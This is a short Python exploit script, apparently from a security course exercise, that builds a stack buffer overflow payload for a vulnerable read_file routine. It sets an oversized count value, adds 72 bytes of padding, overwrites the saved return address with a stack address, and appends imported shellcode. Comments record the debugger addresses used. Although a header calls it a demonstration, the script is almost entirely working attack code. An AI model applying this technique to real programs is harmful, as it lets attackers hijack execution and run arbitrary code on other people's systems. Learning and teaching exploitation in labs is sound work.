#!/usr/bin/env python3
from shellcode import shellcode

"""
Integer Parsing & Buffer Overflow Demonstration
-----------------------------------------------

This script demonstrates how improper handling of count values
can lead to memory corruption and buffer overflow conditions.
"""

import sys

# address of the pointer to buf: 0x7ffffff29240
# deferenced address of buf: 0x00007ffffff289d0
# return address of read_file: 0x401fe9
# return address on stack: 0x7ffffff29258
# address of where count is: rbp-0x18
# shell starts at 0x7ffffff29260
# we set count to a high enough number that doesnt cause stack overflow
# 0x0000000000401f91 break point

# 0x7ffffff29260 buffer address
# 0x7ffffff29260 : helper
# high count
count = 0x4000000000000000

# address of shell
shellAddress = 0x7ffffff29260

# distance between saved return and buffer
# distance = 0x7ffffff29258 - 0x7ffffff289d0

# found padding
padding = b"A" * 72

# order
finalPayload = count.to_bytes(8, "little") + padding + shellAddress.to_bytes(8, "little")
sys.stdout.buffer.write(finalPayload + shellcode)
